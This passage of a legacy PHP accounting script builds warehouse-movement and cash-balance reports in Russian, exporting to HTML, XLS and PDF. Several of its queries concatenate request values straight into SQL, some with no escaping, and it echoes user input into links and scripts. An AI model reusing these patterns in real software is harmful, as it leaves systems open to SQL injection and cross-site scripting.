                $filterContent = str_replace( '{dtstart}', ' value="'.date( 'd.m.Y H:i:s', strtotime( $_GET['dt1'] ) ).'"', $filterContent );
                $filterContent = str_replace( '{dtend}', ' value="'.date( 'd.m.Y H:i:s', strtotime( $_GET['dt2'] ) ).'"', $filterContent );

            }
            
            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[] = '<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            //if ( $showHeaders ) $output[] = '<br /><br />Товар: <b>'.$itemname.'</b><br />Склад: <b>'.$whname.'</b><br /><br />';
            $output[] = '<div class="div_otchet">';
            //$output[] = 'Список документов'.( $showHeaders ? ' за период <b>с '.$period.'</b>' : '' ).':<br />';
            $output[] = 'Список документов:<br />';
            
            $output[] = '<table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Документ</td>
'.(empty($_GET['item'])?'<td rowspan="2">Товар</td>':'').'
'.(!empty($_GET['item'])?'<td colspan="2">До проведения</td>':'').'
<td colspan="2">Приход</td>
<td colspan="2">Расход</td>
'.(!empty($_GET['item'])?'<td colspan="2">После проведения</td>':'').'
</tr>
<tr class="tableheader">
'.(!empty($_GET['item'])?'<td>Кол-во</td>
<td>Сумма</td>':'').'
<td>Кол-во</td>
<td>Сумма</td>
<td>Кол-во</td>
<td>Сумма</td>
'.(!empty($_GET['item'])?'
<td>Кол-во</td>
<td>Сумма</td>':'').'
</tr>';
            
            $query = mysql_query( "SELECT
IF(r.documenttype = 0, CONCAT('d_order-', do.id),
IF(r.documenttype = 1, CONCAT('d_receipt-', dr.id), 
IF(r.documenttype = 2, CONCAT('d_selling-', ds.id),
IF(r.documenttype = 3, CONCAT('d_posting-', dp.id),
IF(r.documenttype = 4, CONCAT('d_cancellation-', dc.id),
IF(r.documenttype = 6, CONCAT('d_movement-', dm.id), 
IF(r.documenttype = 7, CONCAT('d_production-', dd.id), 
IF(r.documenttype = 8, CONCAT('d_regrading-', dg.id), '')))))))) AS id,                

IF(r.documenttype = 0, CONCAT('Счет №', do.idout, ' от ', DATE_FORMAT(do.dtclose,'%d.%m.%Y %H:%i:%s')),
IF(r.documenttype = 1, CONCAT('Поступление товаров ', dr.idout, ' от ', DATE_FORMAT(dr.dt,'%d.%m.%Y %H:%i:%s')), 
IF(r.documenttype = 2, CONCAT('Реализация товаров ', ds.idout, ' от ', DATE_FORMAT(ds.dt,'%d.%m.%Y %H:%i:%s')),
IF(r.documenttype = 3, CONCAT('Оприходование товаров ', dp.idout, ' от ', DATE_FORMAT(dp.dt,'%d.%m.%Y %H:%i:%s')),
IF(r.documenttype = 4, CONCAT('Списание товаров ', dc.idout, ' от ', DATE_FORMAT(dc.dt,'%d.%m.%Y %H:%i:%s')),
IF(r.documenttype = 6, CONCAT('Перемещение товаров ', dm.idout, ' от ', DATE_FORMAT(dm.dt,'%d.%m.%Y %H:%i:%s')), 
IF(r.documenttype = 7, CONCAT('Выпуск продукции ', dd.idout, ' от ', DATE_FORMAT(dd.dt,'%d.%m.%Y %H:%i:%s')), 
IF(r.documenttype = 8, CONCAT('Пересортица товаров ', dg.idout, ' от ', DATE_FORMAT(dg.dt,'%d.%m.%Y %H:%i:%s')), '')))))))) AS doc,
IF(SUM(r.quantity) > 0, SUM(r.quantity), 0) AS quantityplus, IF(SUM(r.quantity) > 0, SUM(r.costsum), 0) AS plussum,
IF(SUM(r.quantity) < 0, (-1) * SUM(r.quantity), 0) AS quantityminus, IF(SUM(r.quantity) < 0, (-1) * SUM(r.costsum), 0) AS minussum,
w.name AS warehouse,i.name as itemname
FROM r_remainder AS r 
LEFT JOIN s_warehouse AS w ON w.id = r.warehouseid
LEFT JOIN s_items AS i ON i.id = r.itemid
LEFT JOIN d_order AS do ON do.id = r.documentid AND r.documenttype = 0
LEFT JOIN d_receipt AS dr ON dr.id = r.documentid AND r.documenttype = 1
LEFT JOIN d_selling AS ds ON ds.id = r.documentid AND r.documenttype = 2
LEFT JOIN d_posting AS dp ON dp.id = r.documentid AND r.documenttype = 3
LEFT JOIN d_cancellation AS dc ON dc.id = r.documentid AND r.documenttype = 4
LEFT JOIN d_movement AS dm ON dm.id = r.documentid AND r.documenttype = 6
LEFT JOIN d_production AS dd ON dd.id = r.documentid AND r.documenttype = 7
LEFT JOIN d_regrading AS dg ON dg.id = r.documentid AND r.documenttype = 8
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2 ) : '' )."
GROUP BY r.id
ORDER BY warehouse, r.dt,r.id" );

//GROUP BY r.warehouseid, r.documenttype, r.documentid, r.parentid 


            
            $newrquantity = $rquantity;
            $newrsum = $rsum;
            
            $i = 1;
            $sum['quantityplus'] = 0;
            $sum['plussum'] = 0;
            $sum['quantityminus'] = 0;
            $sum['minussum'] = 0;
            
            $wqplus = 0;
            $wsplus = 0;
            $wqminus = 0;
            $wsminus = 0;
            
            $curwarehouse = '';
            $i = 1;
            while ( $row = mysql_fetch_assoc( $query ) ){
                if ( $curwarehouse != $row['warehouse']){
                    if ( $i > 1 ){
                        $output[] = '<tr class="tableheader">
<td colspan="4">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $wqplus < 0 ? $deficitColor : '' ).'"><b>'.round( $wqplus, 3 ).'</b></td>
<td style="'.$right.( $wsplus < 0 ? $deficitColor : '' ).'"><b>'.round( $wsplus, 2 ).'</b></td>
<td style="'.$right.( $wqminus < 0 ? $deficitColor : '' ).'"><b>'.round( $wqminus, 3 ).'</b></td>
<td style="'.$right.( $wsminus < 0 ? $deficitColor : '' ).'"><b>'.round( $wsminus, 2 ).'</b></td>
<td colspan="2"></td>
</tr>';
                
                        $wqplus = 0;
                        $wsplus = 0;
                        $wqminus = 0;
                        $wsminus = 0;
                    }
                    
                    $curwarehouse = $row['warehouse'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="'.(empty($_GET['item'])?7:10).'">Склад: <b>'.$curwarehouse.'</b></td></tr>';
                    $i++;
                }
                
                $sum['quantityplus'] += $row['quantityplus'];
                $sum['plussum'] += $row['plussum'];
                $sum['quantityminus'] += $row['quantityminus'];
                $sum['minussum'] += $row['minussum'];
                
                $wqplus += $row['quantityplus'];
                $wsplus += $row['plussum'];
                $wqminus += $row['quantityminus'];
                $wsminus += $row['minussum'];

                $output[] = '<tr class="doc" id="'.$row['id'].'">
<td style="'.$right.'">'.$i.'</td>
<td>'.$row['doc'].'</td>
'.(empty($_GET['item'])?'<td>'.$row['itemname'].'</td>':'').'

'.(!empty($_GET['item'])?'
<td style="'.$right.( $newrquantity < 0 ? $deficitColor : '' ).'">'.round( $newrquantity, 3 ).'</td>
<td style="'.$right.( $newrsum < 0 ? $deficitColor : '' ).'">'.round( $newrsum, 2 ).'</td>':'').'
<td style="'.$right.( $row['quantityplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityplus'], 3 ).'</td>
<td style="'.$right.( $row['plussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['plussum'], 2 ).'</td>
<td style="'.$right.( $row['quantityminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityminus'], 3 ).'</td>
<td style="'.$right.( $row['minussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['minussum'], 2 ).'</td>
'.(!empty($_GET['item'])?'
<td style="'.$right.( $newrquantity + $row['quantityplus'] - $row['quantityminus'] < 0 ? $deficitColor : '' ).'">'.round( $newrquantity + $row['quantityplus'] - $row['quantityminus'], 3 ).'</td>
<td style="'.$right.( $newrsum + $row['plussum'] - $row['minussum'] < 0 ? $deficitColor : '' ).'">'.round( $newrsum + $row['plussum'] - $row['minussum'], 2 ).'</td>':'').'
</tr>';
                $i++;
                $newrquantity = $newrquantity + $row['quantityplus'] - $row['quantityminus'];
                $newrsum = $newrsum + $row['plussum'] - $row['minussum'];
            }
            
            if ( $i > 1 ){
                $output[] = '<tr class="tableheader">
<td colspan="'.(empty($_GET['item'])?3:4).'">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $wqplus < 0 ? $deficitColor : '' ).'"><b>'.round( $wqplus, 3 ).'</b></td>
<td style="'.$right.( $wsplus < 0 ? $deficitColor : '' ).'"><b>'.round( $wsplus, 2 ).'</b></td>
<td style="'.$right.( $wqminus < 0 ? $deficitColor : '' ).'"><b>'.round( $wqminus, 3 ).'</b></td>
<td style="'.$right.( $wsminus < 0 ? $deficitColor : '' ).'"><b>'.round( $wsminus, 2 ).'</b></td>
'.(!empty($_GET['item'])?'<td colspan="2"></td>':'').'
</tr>';
            }
            
            $output[] = '<tr class="tableheader">
<td colspan="'.(empty($_GET['item'])?3:2).'"><b>Итого</b></td>
'.(!empty($_GET['item'])?'
<td style="'.$right.( $rquantity < 0 ? $deficitColor : '' ).'"><b>'.round( $rquantity, 3 ).'</b></td>
<td style="'.$right.( $rsum < 0 ? $deficitColor : '' ).'"><b>'.round( $rsum, 2 ).'</b></td>':'').'
<td style="'.$right.( $sum['quantityplus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['quantityplus'], 3 ).'</b></td>
<td style="'.$right.( $sum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['plussum'], 2 ).'</b></td>
<td style="'.$right.( $sum['quantityminus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['quantityminus'], 3 ).'</b></td>
<td style="'.$right.( $sum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['minussum'], 2 ).'</b></td>
'.(!empty($_GET['item'])?'<td style="'.$right.( $newrquantity < 0 ? $deficitColor : '' ).'"><b>'.round( $newrquantity, 3 ).'</b></td>
<td style="'.$right.( $newrsum < 0 ? $deficitColor : '' ).'"><b>'.round( $newrsum, 2 ).'</b></td>':'').'
</tr>';
             
            $output[] = '</table><br />';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
            } else if ( $fromRR ){
                
                $output[] = '<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
                
                $filterContent = str_replace( '{result}', join( "\n", $output ), $filterContent );
                
                echo $filterContent;
                die( '<script>
$( ".doc" ).die( "click" );
$( ".doc" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "-" );
    table = s.substr( 0, pos1 );
    id = s.substr( pos1 + 1 );
    
    console.log( table + " - " + id );
    
    if ( table == "d_order" ) zview_el( table, id );
    else viewA( table, id );
});
</script>' );
                
            } else echo join( "\n", $output );
             
             echo '</div>';  
             if ( empty( $_GET['print'] ) ){
                echo '<script>
$( ".doc" ).die( "click" );
$( ".doc" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "-" );
    table = s.substr( 0, pos1 );
    id = s.substr( pos1 + 1 );
    
    console.log( table + " - " + id );
    
    if ( table == "d_order" ) zview_el( table, id );
    else viewA( table, id );
});
</script>';                 
                 
                 echo '<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
             }
//             echo '</div></div></div></div>';  
///////////////////////////////////////
        break;
        
        case 'cash_remains':           
             //Вывод на экран
             $output = array();
             //Сортировка
             $order = 'id';
             //Группировка
             $group = '';
             //В эксель выводим бордеры у таблиц
             $inxls = '';
             
             //Принт версия
             if ( isset( $_GET['print'] ) ){
                 $inxls = 'border="1"';
                 if ( isset( $_GET['chb'] ) ) $_POST['chb'] = $_GET['chb'];
                 if ( isset( $_GET['chb_zasmenu'] ) ) $_POST['chb_zasmenu'] = $_GET['chb_zasmenu'];
                 if ( isset( $_GET['chb_zaperiod1'] ) ) $_POST['chb_zaperiod1'] = $_GET['chb_zaperiod1'];
                 if ( isset( $_GET['chb_zaperiod2'] ) ) $_POST['chb_zaperiod2'] = $_GET['chb_zaperiod2'];
                 if ( isset( $_GET['cashid'] ) )   $_POST['cashid']   = $_GET['cashid'];
             } else {
                 //Формирование ссылки на кнопку "В файл"
                $query_string = array();
                if ( isset( $_POST['chb'] ) ) $query_string[] = 'chb='.$_POST['chb'];
                if ( isset( $_POST['chb_zasmenu'] ) ) $query_string[] = 'chb_zasmenu='.$_POST['chb_zasmenu'];
                if ( isset( $_POST['chb_zaperiod1'] ) ) $query_string[] = 'chb_zaperiod1='.$_POST['chb_zaperiod1'];
                if ( isset( $_POST['chb_zaperiod2'] ) ) $query_string[] = 'chb_zaperiod2='.$_POST['chb_zaperiod2'];
                if ( isset( $_POST['cashid'] ) )   $query_string[] = 'cashid='.$_POST['cashid'];
            }

            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[]='<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            $output[]='<div class="div_otchet">';
            
            $i = 1;
            $title = '';

            //ФИЛЬТРЫ
            $where1 = array();
            $where2 = array();
            $where3 = array();
            if ( $_POST['cashid'] > 0 ){
                $where1[] = 'cashid="'.addslashes( $_POST['cashid'] ).'"';
                $where2[] = 'r.cashid="'.addslashes( $_POST['cashid'] ).'"';
                $where3[] = 'r.cashid="'.addslashes( $_POST['cashid'] ).'"';
            }
            switch( $_POST['chb'] ){
                case 'zasmenu':
                    if ( $_POST['chb_zasmenu'] > 0 ){
                        $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                        $row = mysql_fetch_array( $result );
                        
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'"';
                        $_POST['chb_zaperiod1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                        
                        if ( $row['closed'] == 0 ){
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', time() );
                        } else {
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) );
                        }
                        $title = 'За смену: '.$row['dtopen'].'_'.$row['dtclosed'];
                    }
                break;
                case 'zaperiod':
                    if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'"';
                        $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $title='За период: с '.$_POST['chb_zaperiod1'].' по '.$_POST['chb_zaperiod2'];
                    }
                break;
            }

            $output[] = $title.'<br />';
            $output[]='<div><table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Вид оплаты</td>
<td colspan="4">Сумма</td>
</tr>
<tr class="tableheader">
<td>Начало периода</td>
<td>Приход</td>
<td>Расход</td>
<td>Конец периода</td>
</tr>';

            $query = mysql_query( "SELECT 
IFNULL(w.name, '') AS cash, r.cashid,
IFNULL(p.name, '') AS payment, r.paymentid, 
IFNULL(remains.amount, 0) AS amount, 
IFNULL(income.amount, 0) AS amountplus,
IFNULL(outcome.amount, 0) AS amountminus,  
(IFNULL(remains.amount, 0) + IFNULL(income.amount, 0) - IFNULL(outcome.amount, 0)) AS newamount
FROM r_cash AS r 
LEFT JOIN ( 
SELECT cashid, paymentid, SUM(amount) AS amount 
FROM r_cash AS r
".( !empty( $where1 ) ? ' WHERE '.join( ' AND ', $where1) : '' )."
GROUP BY cashid, paymentid
) AS remains ON remains.cashid = r.cashid AND remains.paymentid = r.paymentid
LEFT JOIN ( 
SELECT cashid, paymentid, SUM(amount) AS amount 
FROM r_cash AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND amount > 0
GROUP BY cashid, paymentid
) AS income ON income.cashid = r.cashid AND income.paymentid = r.paymentid 
LEFT JOIN ( 
SELECT cashid, paymentid, (-1) * SUM(amount) AS amount 
FROM r_cash AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND amount < 0
GROUP BY cashid, paymentid
) AS outcome ON outcome.cashid = r.cashid AND outcome.paymentid = r.paymentid 
LEFT JOIN s_cash AS w ON w.id = r.cashid
LEFT JOIN s_types_of_payment AS p ON p.id = r.paymentid 
".( !empty( $where3 ) ? ' WHERE '.join( ' AND ', $where3) : '' )."
GROUP BY r.cashid, r.paymentid 
ORDER BY cash, payment" );
            
            $i = 1;
            $sum['amount'] = 0;
            $sum['amountplus'] = 0;
            $sum['amountminus'] = 0;
            $sum['newrsum'] = 0;
            $cursum['amount'] = 0;
            $cursum['amountplus'] = 0;
            $cursum['amountminus'] = 0;
            $cursum['newamount'] = 0;
            $curcash = '';
            while ( $row = mysql_fetch_assoc( $query ) ){
                if ( $curcash != $row['cash']){
                    if ( $i > 1 ){
                        $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="2">Итого по кассе <b>'.$curcash.'</b></td>
<td style="'.$right.( $cursum['amount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amount'], 2 ).'</b></td>
<td style="'.$right.( $cursum['amountplus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amountplus'], 2 ).'</b></td>
<td style="'.$right.( $cursum['amountminus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amountminus'], 2 ).'</b></td>
<td style="'.$right.( $cursum['newamount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['newamount'], 2 ).'</b></td>
</tr>';
                        
                        $sum['amount'] += $cursum['amount'];
                        $sum['amountplus'] += $cursum['amountplus'];
                        $sum['amountminus'] += $cursum['amountminus'];
                        $sum['newamount'] += $cursum['newamount'];
                        $cursum['amount'] = 0;
                        $cursum['amountplus'] = 0;
                        $cursum['amountminus'] = 0;
                        $cursum['newamount'] = 0;
                    }
                    
                    $curcash = $row['cash'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="6">Касса: <b>'.$row['cash'].'</b></td></tr>';
                }
                
                $cursum['amount'] += $row['amount'];
                $cursum['amountplus'] += $row['amountplus'];
                $cursum['amountminus'] += $row['amountminus'];
                $cursum['newamount'] += $row['newamount'];
                
                $sum['amount'] += $row['amount'];
                $sum['amountplus'] += $row['amountplus'];
                $sum['amountminus'] += $row['amountminus'];
                $sum['newamount'] += $row['newamount'];

                $output[] = '<tr id="'.$row['cashid'].'_'.$row['paymentid'].'" class="itemremains">
<td>'.$i.'</td>
<td>'.$row['payment'].'</td>
<td style="'.$right.( $row['amount'] < 0 ? $deficitColor : '' ).'">'.round( $row['amount'], 2 ).'</td>
<td style="'.$right.( $row['amountplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['amountplus'], 2 ).'</td>
<td style="'.$right.( $row['amountminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['amountminus'], 2 ).'</td>
<td style="'.$right.( $row['newamount'] < 0 ? $deficitColor : '' ).'">'.round( $row['newamount'], 2 ).'</td>
</tr>';
                $i++;
            }
            
            $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="2">Итого по кассе <b>'.$curcash.'</b></td>
<td style="'.$right.( $cursum['amount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amount'], 2 ).'</b></td>
<td style="'.$right.( $cursum['amountplus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amountplus'], 2 ).'</b></td>
<td style="'.$right.( $cursum['amountminus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['amountminus'], 2 ).'</b></td>
<td style="'.$right.( $cursum['newamount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['newamount'], 2 ).'</b></td>
</tr>';
            
            $output[] = '<tr class="tableheader">
<td colspan="2"><b>Итого</b></td>
<td style="'.$right.( $sum['amount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['amount'], 2 ).'</b></td>
<td style="'.$right.( $sum['amountplus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['amountplus'], 2 ).'</b></td>
<td style="'.$right.( $sum['amountminus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['amountminus'], 2 ).'</b></td>
<td style="'.$right.( $sum['newamount'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['newamount'], 2 ).'</b></td>
</tr>';
             
            $output[] = '</table></div><br />';
            $output[] = '</div>';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
             } else echo join( "\n", $output );
             if ( empty( $_GET['print'] ) && empty( $_SESSION['idap'] ) ){
                 echo '<script>
$( ".itemremains" ).die( "click" );
$( ".itemremains" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "_" );
    cashid = s.substr( 0, pos1 );
    paymentid = s.substr( pos1 + 1 );
    title = "Движение денежных средств";
    otchet = "gethtml_cash_remainsdetailed";
    $.ajax({ 
        type: "POST",
        url: "/company/warehouse/warehouse.php?do=cash_remainsdetailed&cash="+cashid+"&payment="+paymentid+"&dt1='.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'&dt2='.date( 'Y-m-d H:i:s',strtotime( $_POST['chb_zaperiod2'] ) ).'"
    }).success( function ( form ){
        removeTabIfExist( \'#tab_\' + otchet );
        cont = \'<div class="bggrey"><h4>\' + title + \'</h4></div><div class="righttd-content">\' + form + \'</div>\';     
        addTab( title, otchet, cont ); 
        $( \'.righttd-content\' ).height( $( \'.righttd\' ).height() - 144 );
    });
});
</script>';
                 
                 echo '<a href="/company/warehouse/warehouse.php?do=cash_remains&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=cash_remains&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=cash_remains&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
             }
///////////////////////////////////////
        break;
        
        case 'cash_remainsdetailed':
            $output = array();
            $order = 'id';
            $group = '';
            $inxls = '';
            $fromRR = true;
            
            if ( isset( $_POST['cashid'] ) ){
                $_GET['cash'] = $_POST['cashid'];
                $_GET['payment'] = $_POST['paymentid'];
                 
                if ( isset( $_POST['chb'] ) ){
                    switch( $_POST['chb'] ){
                        case 'zasmenu':
                            if ( $_POST['chb_zasmenu'] > 0 ){
                                $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                                $row = mysql_fetch_array( $result );

                                $_GET['dt1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                                $_GET['dt2'] = date( 'Y-m-d H:i:s', ( $row['closed'] == 0 ? time() : strtotime( $row['dtclosed'] ) ) );
                            }
                        break;
                        case 'zaperiod':
                            if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                                $_GET['dt1'] = date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) );
                                $_GET['dt2'] = date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) );
                            }
                        break;
                    }
                }
                
                $fromRR = false;
            }
             
            if ( isset( $_GET['print'] ) ){
                $inxls = 'border="1"';
            } else {
                $query_string = array();
                if ( isset( $_GET['dt1'] ) )        $query_string[] = 'dt1='.$_GET['dt1'];
                if ( isset( $_GET['dt2'] ) )        $query_string[] = 'dt2='.$_GET['dt2'];
                if ( isset( $_GET['cash'] ) )       $query_string[] = 'cash='.$_GET['item'];
            }
            
            $i = 1;
            $title = '';

            $where1 = array();
            $where2 = array();
            if ( $_GET['cash'] > 0 ){
                $where1[] = 'cashid="'.addslashes( $_GET['cash'] ).'"';
                $where2[] = 'r.cashid="'.addslashes( $_GET['cash'] ).'"';
            }
            if ( $_GET['payment'] > 0 ){
                $where1[] = 'paymentid="'.addslashes( $_GET['payment'] ).'"';
                $where2[] = 'r.paymentid="'.addslashes( $_GET['payment'] ).'"';
            }
            $period = '';
            if ( ( $_GET['dt1'] != '' ) && ( $_GET['dt2'] != '' ) ){
                $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_GET['dt1'] ) ).'"';
                $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_GET['dt1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s',strtotime( $_GET['dt2'] ) ).'"';
                
                $period = date( 'd.m.Y H:i:s', strtotime( $_GET['dt1'] ) ).' по '.date( 'd.m.Y H:i:s', strtotime( $_GET['dt2'] ) );
            }
            
            $ramount = 0;
            
            $query = mysql_query( "SELECT DISTINCT IFNULL(remains.amount, 0) AS amount 
FROM r_cash AS r 
LEFT JOIN ( 
SELECT cashid, SUM(amount) AS amount  
FROM r_cash AS r
".( !empty( $where1 ) ? ' WHERE '.join( ' AND ', $where1) : '' )."
GROUP BY cashid
) AS remains ON remains.cashid = r.cashid 
